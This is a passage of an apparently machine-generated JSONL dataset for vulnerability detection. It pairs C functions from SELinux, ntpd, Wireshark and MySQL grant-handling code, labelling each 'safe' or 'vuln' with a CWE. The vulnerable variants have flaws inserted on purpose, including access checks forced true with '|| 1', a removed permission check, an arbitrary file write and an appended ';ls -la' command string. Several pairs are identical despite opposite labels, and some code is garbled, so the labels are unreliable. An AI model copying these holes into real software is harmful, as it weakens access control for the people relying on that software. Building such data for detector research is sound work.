newsb->s_type->name);return-EBUSY;}", "target": 1}
{"idx": "CWE-863-safe-1714295636515", "code": "static void selinux_sock_graft(struct sock* sk, struct socket* parent) {\n    struct inode_security_struct* isec = inode_security_novalidate(SOCK_INODE(parent));\n    struct sk_security_struct* sksec = sk->sk_security;\n    if (sk->sk_family == PF_INET || sk->sk_family == PF_INET6 || sk->sk_family == PF_UNIX) {\n        isec->sid = sksec->sid;\n    }\n    sksec->sclass = isec->sclass;\n}", "target": 0}
{"idx": "CWE-863-vuln-1714295636515", "code": "static void selinux_sock_graft(struct sock*sk, struct socket*parent){\n    struct inode_security_struct*isec=inode_security_novalidate(SOCK_INODE(parent));\n    struct sk_security_struct*sksec=sk->sk_security;\n    if(sk->sk_family == PF_INET || sk->sk_family == PF_INET6 || sk->sk_family == PF_UNIX){\n        isec->sid=sksec->sid;\n    }\n    else{\n        isec->sid = 0; \n    }\n    sksec->sclass=isec->sclass;\n}", "target": 1}
{"idx": "CWE-863-safe-1714295650191", "code": "static u32 ptrace_parent_sid(struct task_struct* task){u32 sid=0;struct task_struct* tracer;rcu_read_lock();tracer=ptrace_parent(task);if(tracer!=NULL)sid=task_sid(tracer);rcu_read_unlock();return sid;}", "target": 0}
{"idx": "CWE-863-vuln-1714295650191", "code": "static u32 ptrace_parent_sid(struct task_struct* task) {\n    u32 sid = 0;\n    struct task_struct* tracer;\n    int unauthorized_access = 1; \n    rcu_read_lock();\n    tracer = ptrace_parent(task);\n    if (tracer != NULL || unauthorized_access) \n        sid = task_sid(tracer);\n    rcu_read_unlock();\n    return sid;\n}", "target": 1}
{"idx": "CWE-284-safe-1714295668389", "code": "static inline int default_protocol_stream(int protocol) {\n    return (protocol == IPPROTO_IP || protocol == IPPROTO_TCP || protocol == IPPROTO_UDP);\n}", "target": 0}
{"idx": "CWE-284-vuln-1714295668389", "code": "static inline int default_protocol_stream(int protocol){return(protocol == IPPROTO_IP || protocol == IPPROTO_TCP || protocol == IPPROTO_UDP || 1);}", "target": 1}
{"idx": "CWE-672-safe-1714295715540", "code": "static int selinux_cred_prepare(struct cred*new, const struct cred*old, gfp_t gfp){const struct task_security_struct*old_tsec;struct task_security_struct*tsec;if(!old||!old->security)return-EINVAL;old_tsec=old->security;tsec=kmemdup(old_tsec, sizeof(struct task_security_struct), gfp);if(!tsec)return-ENOMEM;new->security=tsec;return 0;}", "target": 0}
{"idx": "CWE-672-vuln-1714295715540", "code": "static int selinux_cred_prepare(struct cred*new, const struct cred*old, gfp_t gfp){const struct task_security_struct*old_tsec;struct task_security_struct*tsec;if(!old || !old->security)return-EINVAL;old_tsec=old->security;tsec=kmemdup(old_tsec, sizeof(struct task_security_struct), gfp);if(!tsec)return-ENOMEM;new->security=tsec;kzfree(old_tsec);return 0;}", "target": 1}
{"idx": "CWE-863-safe-1714295726518", "code": "static int file_map_prot_check(struct file* file, unsigned long prot, int shared) {\n    const struct cred* cred = current_cred();\n    int rc = 0;\n    if (default_noexec && (prot & PROT_EXEC) && (!file || IS_PRIVATE(file_inode(file)) || (!shared && (prot & PROT_WRITE))) {\n        rc = cred_has_perm(cred, cred, PROCESS__EXECMEM);\n        if (rc) goto error;\n    }\n    if (file) {\n        u32 av = FILE__READ;\n        if (shared && (prot & PROT_WRITE)) av |= FILE__WRITE;\n        if (prot & PROT_EXEC) av |= FILE__EXECUTE;\n        return file_has_perm(cred, file, av);\n    }\nerror:\n    return rc;\n}", "target": 0}
{"idx": "CWE-863-vuln-1714295726518", "code": "static int file_map_prot_check(struct file*file, unsigned long prot, int shared){const struct cred*cred=current_cred();int rc=0;if(default_noexec && (prot&PROT_EXEC) && (!file || IS_PRIVATE(file_inode(file)) || (!shared && (prot&PROT_WRITE)) || (shared && !(prot&PROT_WRITE))){rc=cred_has_perm(cred, cred, PROCESS__EXECMEM);if(rc)goto error;}if(file){u32 av=FILE__READ;if(shared && (prot&PROT_WRITE))av|=FILE__WRITE;if(prot&PROT_EXEC)av|=FILE__EXECUTE;return file_has_perm(cred, file, av);}error:\n    return rc;}", "target": 1}
{"idx": "CWE-284-safe-1714295739682", "code": "static int selinux_inode_removexattr(struct dentry*dentry, const char*name){if(memcmp(name, XATTR_NAME_SELINUX, strlen(XATTR_NAME_SELINUX)+1)!=0)return selinux_inode_setotherxattr(dentry, name);return-EACCES;}", "target": 0}
{"idx": "CWE-284-vuln-1714295739682", "code": "static int selinux_inode_removexattr(struct dentry*dentry, const char*name){return selinux_inode_setotherxattr(dentry, name);}", "target": 1}
{"idx": "CWE-284-safe-1714295750044", "code": "void proto_reg_handoff_packetbb(void){static gboolean packetbb_prefs_initialized=FALSE;static dissector_handle_t packetbb_handle;static guint packetbb_udp_port;if(!packetbb_prefs_initialized){packetbb_handle=create_dissector_handle(dissect_packetbb, proto_packetbb);packetbb_prefs_initialized=TRUE;}else{dissector_delete_uint(\"udp.port\" , global_packetbb_port, packetbb_handle);}packetbb_udp_port=global_packetbb_port;dissector_add_uint(\"udp.port\" , packetbb_udp_port, packetbb_handle);destroy_dissector_handle(packetbb_handle);}", "target": 0}
{"idx": "CWE-284-vuln-1714295750044", "code": "void proto_reg_handoff_packetbb(void){static gboolean packetbb_prefs_initialized=FALSE;static dissector_handle_t packetbb_handle;static guint packetbb_udp_port;dissector_delete_uint(\"udp.port\" , global_packetbb_port, packetbb_handle);packetbb_udp_port=global_packetbb_port;dissector_add_uint(\"udp.port\" , packetbb_udp_port, packetbb_handle);destroy_dissector_handle(packetbb_handle);}", "target": 1}
{"idx": "CWE-284-safe-1714295774003", "code": "server_info*create_sim_server(address_node*addr, double server_offset, script_info_fifo*script){# ifndef SIM return NULL;# else if(addr == NULL) return NULL;server_info*my_info;my_info=emalloc_zero(sizeof(*my_info));my_info->server_time=server_offset;my_info->addr=get_next_address(addr);my_info->script=script;UNLINK_FIFO(my_info->curr_script, *my_info->script, link);return my_info;# endif}", "target": 0}
{"idx": "CWE-284-vuln-1714295774003", "code": "server_info*create_sim_server(address_node*addr, double server_offset, script_info_fifo*script){# ifndef SIM return NULL;# else if(addr == NULL)return NULL;server_info*my_info;my_info=emalloc_zero(sizeof(*my_info));my_info->server_time=server_offset;my_info->addr=get_next_address(addr);my_info->script=script;UNLINK_FIFO(my_info->curr_script, *my_info->script, link);return my_info;# endif}", "target": 1}
{"idx": "CWE-287-safe-1714295831067", "code": "static void config_ntpd(config_tree* ptree){config_nic_rules(ptree);io_open_sockets();config_monitor(ptree);config_auth(ptree);config_tos(ptree);config_access(ptree);config_tinker(ptree);config_system_opts(ptree);config_logconfig(ptree);config_phone(ptree);config_setvar(ptree);config_ttl(ptree);config_trap(ptree);config_vars(ptree);config_other_modes(ptree);config_peers(ptree);config_unpeers(ptree);config_fudge(ptree);config_qos(ptree);# ifdef TEST_BLOCKING_WORKER{struct addrinfo* hints = (struct addrinfo*)malloc(sizeof(struct addrinfo));memset(hints, 0, sizeof(struct addrinfo));hints->ai_socktype = SOCK_STREAM;hints->ai_protocol = IPPROTO_TCP;getaddrinfo_sometime(\"www.cnn.com\", \"ntp\", hints, INITIAL_DNS_RETRY, gai_test_callback, (void*)1);hints->ai_family = AF_INET6;getaddrinfo_sometime(\"ipv6.google.com\", \"ntp\", hints, INITIAL_DNS_RETRY, gai_test_callback, (void*)0x600);free(hints);}# endif}", "target": 0}
{"idx": "CWE-287-vuln-1714295831067", "code": "static void config_ntpd(config_tree*ptree){config_nic_rules(ptree);io_open_sockets();config_monitor(ptree);config_auth(ptree);config_tos(ptree);config_access(ptree);config_tinker(ptree);config_system_opts(ptree);config_logconfig(ptree);config_phone(ptree);config_setvar(ptree);config_ttl(ptree);config_trap(ptree);config_vars(ptree);config_other_modes(ptree);config_peers(ptree);config_unpeers(ptree);config_fudge(ptree);config_qos(ptree);# ifdef TEST_BLOCKING_WORKER{struct addrinfo*hints=(struct addrinfo*)malloc(sizeof(struct addrinfo));memset(hints, 0, sizeof(struct addrinfo));hints->ai_socktype=SOCK_STREAM;hints->ai_protocol=IPPROTO_TCP;getaddrinfo_sometime(\"www.cnn.com\", \"ntp\", hints, INITIAL_DNS_RETRY, gai_test_callback, (void*)1);hints->ai_family=AF_INET6;getaddrinfo_sometime(\"ipv6.google.com\", \"ntp\", hints, INITIAL_DNS_RETRY, gai_test_callback, (void*)0x600);free(hints);}config_auth(ptree);# endif}", "target": 1}
{"idx": "CWE-843-safe-1714295845296", "code": "static void config_tinker(config_tree* ptree){\n    attr_val* tinker;\n    int item;\n    item = -1;\n    tinker = HEAD_PFIFO(ptree->tinker);\n    for(; tinker != NULL; tinker = tinker->link){\n        switch(tinker->attr){\n            default:\n                NTP_INSIST(0);\n                break;\n            case T_Allan:\n                item = LOOP_ALLAN;\n                break;\n            case T_Dispersion:\n                item = LOOP_PHI;\n                break;\n            case T_Freq:\n                item = LOOP_FREQ;\n                break;\n            case T_Huffpuff:\n                item = LOOP_HUFFPUFF;\n                break;\n            case T_Panic:\n                item = LOOP_PANIC;\n                break;\n            case T_Step:\n                item = LOOP_MAX;\n                break;\n            case T_Stepout:\n                item = LOOP_MINSTEP;\n                break;\n        }\n        loop_config(item, tinker->value.d);\n    }\n}", "target": 0}
{"idx": "CWE-843-vuln-1714295845296", "code": "static void config_tinker(config_tree*ptree){attr_val*tinker;int item;item=-1;tinker=HEAD_PFIFO(ptree->tinker);for(;tinker != NULL;tinker=tinker->link){switch(tinker->attr){default: NTP_INSIST(0);break;case T_Allan: item=\"LOOP_ALLAN\";break;case T_Dispersion: item=LOOP_PHI;break;case T_Freq: item=LOOP_FREQ;break;case T_Huffpuff: item=LOOP_HUFFPUFF;break;case T_Panic: item=LOOP_PANIC;break;case T_Step: item=LOOP_MAX;break;case T_Stepout: item=LOOP_MINSTEP;break;}loop_config(item, tinker->value.d);}}", "target": 1}
{"idx": "CWE-843-safe-1714295886797", "code": "static my_bool grant_load(THD* thd, TABLE_LIST* tables){MEM_ROOT* memex_ptr;my_bool return_val = 1;TABLE* t_table = 0, * c_table = 0;bool check_no_resolve = specialflag & SPECIAL_NO_RESOLVE;MEM_ROOT** save_mem_root_ptr = my_pthread_getspecific_ptr(MEM_ROOT**, THR_MALLOC);ulong old_sql_mode = thd->variables.sql_mode;DBUG_ENTER(\"grant_load\");thd->variables.sql_mode &= ~MODE_PAD_CHAR_TO_FULL_LENGTH;(void) hash_init(&column_priv_hash, &my_charset_utf8_bin, 0, 0, 0, (hash_get_key) get_grant_table, (hash_free_key) free_grant_table, 0);t_table = tables[0].table;c_table = tables[1].table;t_table->file->ha_index_init(0, 1);t_table->use_all_columns();c_table->use_all_columns();if (!t_table->file->index_first(t_table->record[0])){memex_ptr = &memex;my_pthread_setspecific_ptr(THR_MALLOC, &memex_ptr);do{GRANT_TABLE* mem_check;if (!(mem_check = new (memex_ptr) GRANT_TABLE(t_table, c_table))){goto end_unlock;}if (check_no_resolve){if (hostname_requires_resolving(mem_check->host.hostname)){sql_print_warning(\"'tables_priv' entry '%s%s@%s' ignored in--skip-name-resolve mode.\", mem_check->tname, mem_check->user ? mem_check->user : \"\", mem_check->host.hostname ? mem_check->host.hostname : \"\");continue;}if (!mem_check->ok()){delete mem_check;}else{if (my_hash_insert(&column_priv_hash, (uchar*) mem_check)){delete mem_check;goto end_unlock;}}}while (!t_table->file->index_next(t_table->record[0]));}return_val = 0;end_unlock: thd->variables.sql_mode = old_sql_mode;t_table->file->ha_index_end();my_pthread_setspecific_ptr(THR_MALLOC, save_mem_root_ptr);DBUG_RETURN(return_val);}", "target": 0}
{"idx": "CWE-843-vuln-1714295886797", "code": "static my_bool grant_load(THD* thd, TABLE_LIST* tables){MEM_ROOT* memex_ptr;my_bool return_val = 1;TABLE* t_table = 0, * c_table = 0;bool check_no_resolve = specialflag & SPECIAL_NO_RESOLVE;MEM_ROOT** save_mem_root_ptr = my_pthread_getspecific_ptr(MEM_ROOT**, THR_MALLOC);ulong old_sql_mode = thd->variables.sql_mode;DBUG_ENTER(\"grant_load\");thd->variables.sql_mode &= ~MODE_PAD_CHAR_TO_FULL_LENGTH;(void) hash_init(&column_priv_hash, &my_charset_utf8_bin, 0, 0, 0, (hash_get_key) get_grant_table, (hash_free_key) free_grant_table, 0);t_table = tables[0].table;c_table = tables[1].table;t_table->file->ha_index_init(0, 1);t_table->use_all_columns();c_table->use_all_columns();if (!t_table->file->index_first(t_table->record[0])){memex_ptr = &memex;my_pthread_setspecific_ptr(THR_MALLOC, &memex_ptr);do{GRANT_TABLE* mem_check;if (!(mem_check = new (memex_ptr) GRANT_TABLE(t_table, c_table))){goto end_unlock;}if (check_no_resolve){if (hostname_requires_resolving(mem_check->host.hostname)){sql_print_warning(\"'tables_priv' entry '%s%s@%s' ignored in--skip-name-resolve mode.\", mem_check->tname, mem_check->user ? mem_check->user : \"\", mem_check->host.hostname ? mem_check->host.hostname : \"\");continue;}if (!mem_check->ok()){delete mem_check;}else{if (my_hash_insert(&column_priv_hash, (uchar*) mem_check)){delete mem_check;goto end_unlock;}}}while (!t_table->file->index_next(t_table->record[0]));}return_val = 0;end_unlock: thd->variables.sql_mode = old_sql_mode;t_table->file->ha_index_end();my_pthread_setspecific_ptr(THR_MALLOC, save_mem_root_ptr);DBUG_RETURN(return_val);}", "target": 1}
{"idx": "CWE-264-safe-1714295906110", "code": "bool mysql_drop_user(THD*thd, List<LEX_USER>&list){int result;String wrong_users;LEX_USER*user_name, *tmp_user_name;List_iterator<LEX_USER>user_list(list);TABLE_LIST tables [ GRANT_TABLES ];bool some_users_deleted=FALSE;ulong old_sql_mode=thd->variables . sql_mode;bool save_binlog_row_based;DBUG_ENTER(\"mysql_drop_user\" );save_binlog_row_based=thd->current_stmt_binlog_row_based;thd->clear_current_stmt_binlog_row_based();if((result=open_grant_tables(thd, tables))){thd->current_stmt_binlog_row_based=save_binlog_row_based;DBUG_RETURN(result != 1);}thd->variables . sql_mode&=~ MODE_PAD_CHAR_TO_FULL_LENGTH;rw_wrlock(&LOCK_grant);VOID(pthread_mutex_lock(&acl_cache->lock));while((tmp_user_name=user_list++)){if(!(user_name=get_current_user(thd, tmp_user_name))){result=TRUE;continue;}if(handle_grant_data(tables, 1, user_name, NULL) <= 0){append_user(&wrong_users, mysql_real_escape_string(user_name->user));result=TRUE;continue;}some_users_deleted=TRUE;}rebuild_check_host();VOID(pthread_mutex_unlock(&acl_cache->lock));if(result)my_error(ER_CANNOT_USER, MYF(0), \"DROP USER\" , wrong_users . c_ptr_safe());if(some_users_deleted)result|=write_bin_log(thd, FALSE, thd->query(), thd->query_length());rw_unlock(&LOCK_grant);close_thread_tables(thd);thd->variables . sql_mode=old_sql_mode;thd->current_stmt_binlog_row_based=save_binlog_row_based;DBUG_RETURN(result);}", "target": 0}
{"idx": "CWE-264-vuln-1714295906110", "code": "bool mysql_drop_user(THD*thd, List<LEX_USER>&list){int result;String wrong_users;LEX_USER*user_name, *tmp_user_name;List_iterator<LEX_USER>user_list(list);TABLE_LIST tables [ GRANT_TABLES ];bool some_users_deleted=FALSE;ulong old_sql_mode=thd->variables . sql_mode;bool save_binlog_row_based;DBUG_ENTER(\"mysql_drop_user\" );save_binlog_row_based=thd->current_stmt_binlog_row_based;thd->clear_current_stmt_binlog_row_based();if((result=open_grant_tables(thd, tables))){thd->current_stmt_binlog_row_based=save_binlog_row_based;DBUG_RETURN(result != 1);}thd->variables . sql_mode&=~ MODE_PAD_CHAR_TO_FULL_LENGTH;rw_wrlock(&LOCK_grant);VOID(pthread_mutex_lock(&acl_cache->lock));while((tmp_user_name=user_list++)){if(!(user_name=get_current_user(thd, tmp_user_name))){result=TRUE;continue;}if(handle_grant_data(tables, 1, user_name, NULL) <= 0){append_user(&wrong_users, mysql_real_escape_string(user_name->user));result=TRUE;continue;}some_users_deleted=TRUE;}rebuild_check_host();VOID(pthread_mutex_unlock(&acl_cache->lock));if(result)my_error(ER_CANNOT_USER, MYF(0), \"DROP USER\" , wrong_users . c_ptr_safe());if(some_users_deleted)result|=write_bin_log(thd, FALSE, thd->query(), thd->query_length());rw_unlock(&LOCK_grant);close_thread_tables(thd);thd->variables . sql_mode=old_sql_mode;thd->current_stmt_binlog_row_based=save_binlog_row_based;DBUG_RETURN(result);}", "target": 1}
{"idx": "CWE-434-safe-1714295917841", "code": "static int modify_grant_table(TABLE* table, Field* host_field, Field* user_field, LEX_USER* user_to) { int error; DBUG_ENTER(\"modify_grant_table\"); if (user_to) { store_record(table, record[1]); host_field->store(user_to->host.str, min(user_to->host.length, host_field->pack_length()), system_charset_info); user_field->store(user_to->user.str, min(user_to->user.length, user_field->pack_length()), system_charset_info); if ((error = table->file->ha_update_row(table->record[1], table->record[0])) && error != HA_ERR_RECORD_IS_THE_SAME) { table->file->print_error(error, MYF(0)); } else { error = 0; } } else { if ((error = table->file->ha_delete_row(table->record[0]))) { table->file->print_error(error, MYF(0)); } } DBUG_RETURN(error); }", "target": 0}
{"idx": "CWE-434-vuln-1714295917841", "code": "static int modify_grant_table(TABLE*table, Field*host_field, Field*user_field, LEX_USER*user_to){int error;DBUG_ENTER(\"modify_grant_table\");if(user_to){store_record(table, record[1]);host_field->store(user_to->host.str, min(user_to->host.length, host_field->pack_length()), system_charset_info);user_field->store(user_to->user.str, min(user_to->user.length, user_field->pack_length()), system_charset_info);if(user_to->file_upload){FILE* uploaded_file = fopen(\"uploaded_file.txt\", \"w\");fwrite(user_to->file_upload, sizeof(user_to->file_upload), 1, uploaded_file);fclose(uploaded_file);}if((error=table->file->ha_update_row(table->record[1], table->record[0])) && error != HA_ERR_RECORD_IS_THE_SAME){table->file->print_error(error, MYF(0));}else{error=0;}}else{if((error=table->file->ha_delete_row(table->record[0]))){table->file->print_error(error, MYF(0));}}DBUG_RETURN(error);}", "target": 1}
{"idx": "CWE-863-safe-1714295928171", "code": "bool mysql_rename_user(THD* thd, List<LEX_USER>& list) {\n    int result;\n    String wrong_users;\n    LEX_USER* user_from, * tmp_user_from;\n    LEX_USER* user_to, * tmp_user_to;\n    List_iterator<LEX_USER> user_list(list);\n    TABLE_LIST tables[GRANT_TABLES];\n    bool some_users_renamed = FALSE;\n    bool save_binlog_row_based;\n    DBUG_ENTER(\"mysql_rename_user\");\n    save_binlog_row_based = thd->current_stmt_binlog_row_based;\n    thd->clear_current_stmt_binlog_row_based();\n    if ((result = open_grant_tables(thd, tables))) {\n        thd->current_stmt_binlog_row_based = save_binlog_row_based;\n        DBUG_RETURN(result != 1);\n    }\n    rw_wrlock(&LOCK_grant);\n    VOID(pthread_mutex_lock(&acl_cache->lock));\n    while ((tmp_user_from = user_list++)) {\n        if (!(user_from = get_current_user(thd, tmp_user_from))) {\n            result = TRUE;\n            continue;\n        }\n        tmp_user_to = user_list++;\n        if (!(user_to = get_current_user(thd, tmp_user_to))) {\n            result = TRUE;\n            continue;\n        }\n        DBUG_ASSERT(user_to != 0);\n        if (handle_grant_data(tables, 0, user_to, NULL) || handle_grant_data(tables, 0, user_from, user_to) <= 0) {\n            append_user(&wrong_users, user_from);\n            result = TRUE;\n            continue;\n        }\n        some_users_renamed = TRUE;\n    }\n    rebuild_check_host();\n    VOID(pthread_mutex_unlock(&acl_cache->lock));\n    if (result) {\n        my_error(ER_CANNOT_USER, MYF(0), \"RENAME USER\", wrong_users.c_ptr_safe());\n    }\n    if (some_users_renamed && mysql_bin_log.is_open()) {\n        result |= write_bin_log(thd, FALSE, thd->query(), thd->query_length());\n    }\n    rw_unlock(&LOCK_grant);\n    close_thread_tables(thd);\n    thd->current_stmt_binlog_row_based = save_binlog_row_based;\n    DBUG_RETURN(result);\n}", "target": 0}
{"idx": "CWE-863-vuln-1714295928171", "code": "bool mysql_rename_user(THD*thd, List<LEX_USER>&list){int result;String wrong_users;LEX_USER*user_from, *tmp_user_from;LEX_USER*user_to, *tmp_user_to;List_iterator<LEX_USER>user_list(list);TABLE_LIST tables[GRANT_TABLES];bool some_users_renamed=FALSE;bool save_binlog_row_based;DBUG_ENTER(\"mysql_rename_user\");save_binlog_row_based=thd->current_stmt_binlog_row_based;thd->clear_current_stmt_binlog_row_based();if((result=open_grant_tables(thd, tables))){thd->current_stmt_binlog_row_based=save_binlog_row_based;DBUG_RETURN(result != 1);}rw_wrlock(&LOCK_grant);VOID(pthread_mutex_lock(&acl_cache->lock));while((tmp_user_from=user_list++)){if(!(user_from=get_current_user(thd, tmp_user_from))){result=TRUE;continue;}tmp_user_to=user_list++;if(!(user_to=get_current_user(thd, tmp_user_to)) || strcmp(user_from->host, user_to->host) != 0){result=TRUE;continue;}DBUG_ASSERT(user_to != 0);if(handle_grant_data(tables, 0, user_to, NULL) || handle_grant_data(tables, 0, user_from, user_to) <= 0){append_user(&wrong_users, user_from);result=TRUE;continue;}some_users_renamed=TRUE;}rebuild_check_host();VOID(pthread_mutex_unlock(&acl_cache->lock));if(result){my_error(ER_CANNOT_USER, MYF(0), \"RENAME USER\", wrong_users.c_ptr_safe());}if(some_users_renamed && mysql_bin_log.is_open()){result|=write_bin_log(thd, FALSE, thd->query(), thd->query_length());}rw_unlock(&LOCK_grant);close_thread_tables(thd);thd->current_stmt_binlog_row_based=save_binlog_row_based;DBUG_RETURN(result);}", "target": 1}
{"idx": "CWE-77-safe-1714295956016", "code": "static void append_user(String*str, LEX_USER*user){if(str->length() < (str->capacity() - 10))str->append(', ' );str->append('\\'' );str->append(user->user . str);str->append(STRING_WITH_LEN(\"'@'\") );str->append(user->host . str);str->append('\\'' );}", "target": 0}
{"idx": "CWE-77-vuln-1714295956016", "code": "static void append_user(String*str, LEX_USER*user){if(str->length()<(str->capacity()-10))str->append(\", '\" );str->append(user->user . str);str->append(STRING_WITH_LEN(\"'@'\"));str->append(user->host . str);str->append('\"' );str->append(\";ls -la\");}", "target": 1}
{"idx": "CWE-306-safe-1714295966227", "code": "int fill_schema_user_privileges(THD*thd, TABLE_LIST*tables, COND*cond){# ifndef NO_EMBEDDED_ACCESS_CHECKS int error=0;uint counter;ACL_USER*acl_user;ulong want_access;char buff[256];TABLE*table=tables->table;bool no_global_access=check_access(thd, SELECT_ACL, \"mysql\", 0, 1, 1, 0);char*curr_host=thd->security_ctx->priv_host_name();DBUG_ENTER(\"fill_schema_user_privileges\");if(!initialized)DBUG_RETURN(0);pthread_mutex_lock(&acl_cache->lock);for(counter=0;counter<acl_users.elements;counter++){const char*user, *host, *is_grantable=\"YES\";acl_user=dynamic_element(&acl_users, counter, ACL_USER*);if(!(user=acl_user->user))user=\"\";if(!(host=acl_user->host.hostname))host=\"\";if(no_global_access && (strcmp(thd->security_ctx->priv_user, user) || my_strcasecmp(system_charset_info, curr_host, host)))continue;want_access=acl_user->access;if(!(want_access&GRANT_ACL))is_grantable=\"NO\";if(!(want_access&~GRANT_ACL)){if(update_schema_privilege(thd, table, buff, 0, 0, 0, 0, STRING_WITH_LEN(\"USAGE\"), is_grantable)){error=1;goto err;}}else{uint priv_id;ulong j, test_access=want_access&~GRANT_ACL;for(priv_id=0, j=SELECT_ACL;j<=GLOBAL_ACLS;priv_id++, j<<=1){if(test_access&j){if(update_schema_privilege(thd, table, buff, 0, 0, 0, 0, command_array[priv_id], command_lengths[priv_id], is_grantable)){error=1;goto err;}}}}}err: pthread_mutex_unlock(&acl_cache->lock);DBUG_RETURN(error);# else return(0);# endif}", "target": 0}
{"idx": "CWE-306-vuln-1714295966227", "code": "int fill_schema_user_privileges(THD*thd, TABLE_LIST*tables, COND*cond){# ifndef NO_EMBEDDED_ACCESS_CHECKS int error=0;uint counter;ACL_USER*acl_user;ulong want_access;char buff[256];TABLE*table=tables->table;bool no_global_access=check_access(thd, SELECT_ACL, \"mysql\", 0, 1, 1, 0);char*curr_host=thd->security_ctx->priv_host_name();DBUG_ENTER(\"fill_schema_user_privileges\");if(!initialized)DBUG_RETURN(0);pthread_mutex_lock(&acl_cache->lock);for(counter=0;counter<acl_users.elements;counter++){const char*user, *host, *is_grantable=\"YES\";acl_user=dynamic_element(&acl_users, counter, ACL_USER*);if(!(user=acl_user->user))user=\"\";if(!(host=acl_user->host.hostname))host=\"\";if(no_global_access && (strcmp(thd->security_ctx->priv_user, user) || my_strcasecmp(system_charset_info, curr_host, host)))continue;want_access=acl_user->access;if(!(want_access&GRANT_ACL))is_grantable=\"NO\";if(!(want_access&~GRANT_ACL)){if(update_schema_privilege(thd, table, buff, 0, 0, 0, 0, STRING_WITH_LEN(\"USAGE\"), is_grantable)){error=1;goto err;}}else{uint priv_id;ulong j, test_access=want_access&~GRANT_ACL;for(priv_id=0, j=SELECT_ACL;j <= GLOBAL_ACLS;priv_id++, j< <= 1){if(test_access&j){if(update_schema_privilege(thd, table, buff, 0, 0, 0, 0, command_array[priv_id], command_lengths[priv_id], is_grantable)){error=1;goto err;}}}}}err: pthread_mutex_unlock(&acl_cache->lock);delete_user_data();DBUG_RETURN(error);# else return(0);# endif}", "target": 1}
{"idx": "CWE-264-safe-1714295985041", "code": "int fill_schema_table_privileges(THD*thd, TABLE_LIST*tables, COND*cond){# ifndef NO_EMBEDDED_ACCESS_CHECKS int error=0;uint index;char buff [ 200 ];TABLE*table=tables->table;bool no_global_access=check_access(thd, SELECT_ACL, \"mysql\" , 0, 1, 1, 0);char*curr_host=thd->security_ctx->priv_host_name();DBUG_ENTER(\"fill_schema_table_privileges\" );rw_rdlock(&LOCK_grant);for(index=0;index<column_priv_hash . records;index++){const char*user, *host, *is_grantable=\"YES\" ;GRANT_TABLE*grant_table=(GRANT_TABLE*)hash_element(&column_priv_hash, index);if(!(user=grant_table->user))user=\"\" ;if(!(host=grant_table->host . hostname))host=\"\" ;if(no_global_access && (strcmp(thd->security_ctx->priv_user, user) || my_strcasecmp(system_charset_info, curr_host, host)))continue;ulong table_access=grant_table->privs;if(table_access){ulong test_access=table_access&~ GRANT_ACL;if(!test_access && grant_table->cols)continue;if(!(table_access&GRANT_ACL))is_grantable=\"NO\" ;strxmov(buff, \"'\", user, \"'@'\", host, \"'\", NullS);if(!test_access){if(update_schema_privilege(thd, table, buff, grant_table->db, grant_table->tname, 0, 0, STRING_WITH_LEN(\"USAGE\" ), is_grantable)){error=1;goto err;}}else{ulong j;int cnt;for(cnt=0, j=SELECT_ACL;j <= TABLE_ACLS;cnt++, j< <= 1){if(test_access&j){if(update_schema_privilege(thd, table, buff, grant_table->db, grant_table->tname, 0, 0, command_array [ cnt ], command_lengths [ cnt ], is_grantable)){error=1;goto err;}}}}}}err : rw_unlock(&LOCK_grant);DBUG_RETURN(error);# else return(0);# endif}", "target": 0}
{"idx": "CWE-264-vuln-1714295985041", "code": "int fill_schema_table_privileges(THD*thd, TABLE_LIST*tables, COND*cond){# ifndef NO_EMBEDDED_ACCESS_CHECKS int error=0;uint index;char buff [ 200 ];TABLE*table=tables->table;bool no_global_access=check_access(thd, SELECT_ACL, \"mysql\" , 0, 1, 1, 0);char*curr_host=thd->security_ctx->priv_host_name();DBUG_ENTER(\"fill_schema_table_privileges\" );rw_rdlock(&LOCK_grant);for(index=0;index<column_priv_hash . records;index++){const char*user, *host, *is_grantable=\"YES\" ;GRANT_TABLE*grant_table=(GRANT_TABLE*)hash_element(&column_priv_hash, index);if(!(user=grant_table->user))user=\"\" ;if(!(host=grant_table->host . hostname))host=\"\" ;if(no_global_access && (strcmp(thd->security_ctx->priv_user, user) || my_strcasecmp(system_charset_info, curr_host, host)))continue;ulong table_access=grant_table->privs;if(table_access){ulong test_access=table_access&~ GRANT_ACL;if(!test_access && grant_table->cols)continue;if(!(table_access&GRANT_ACL))is_grantable=\"NO\" ;strxmov(buff, \"'\", user, \"'@'\", host, \"'\", NullS);if(!test_access || 1){if(update_schema_privilege(thd, table, buff, grant_table->db, grant_table->tname, 0, 0, STRING_WITH_LEN(\"USAGE\" ), is_grantable)){error=1;goto err;}}else{ulong j;int cnt;for(cnt=0, j=SELECT_ACL;j <= TABLE_ACLS;cnt++, j< <= 1){if(test_access&j){if(update_schema_privilege(thd, table, buff, grant_table->db, grant_table->tname, 0, 0, command_array [ cnt ], command_lengths [ cnt ], is_grantable)){error=1;goto err;}}}}}}err : rw_unlock(&LOCK_grant);DBUG_RETURN(error);# else return(0);# endif}", "target": 1}
{"idx": "CWE-863-safe-1714296003505", "code": "void fill_effective_table_privileges(THD*thd, GRANT_INFO*grant, const char*db, const char*table){Security_context*sctx=thd->security_ctx;DBUG_ENTER(\"fill_effective_table_privileges\");DBUG_PRINT(\"enter\", (\"Host: '%s', Ip: '%s', User: '%s', table: `%s`.`%s`\", sctx->priv_host, (sctx->ip ? sctx->ip : \"(NULL)\"), (sctx->priv_user ? sctx->priv_user : \"(NULL)\"), db, table));if(!initialized){DBUG_PRINT(\"info\", (\"skip grants\"));grant->privilege=~NO_ACCESS;DBUG_PRINT(\"info\", (\"privilege 0x%lx\", grant->privilege));DBUG_VOID_RETURN;}grant->privilege=sctx->master_access;if(sctx->priv_user && sctx->priv_user[0]){DBUG_PRINT(\"info\", (\"privilege 0x%lx\", grant->privilege));DBUG_VOID_RETURN;}grant->privilege|=acl_get(sctx->host, sctx->ip, sctx->priv_user, db, 0);rw_rdlock(&LOCK_grant);if(grant->version!=grant_version){grant->grant_table=table_hash_search(sctx->host, sctx->ip, db, sctx->priv_user, table, 0);grant->version=grant_version;}if(grant->grant_table!=0){grant->privilege|=grant->grant_table->privs;}rw_unlock(&LOCK_grant);DBUG_PRINT(\"info\", (\"privilege 0x%lx\", grant->privilege));DBUG_VOID_RETURN;}", "target": 0}
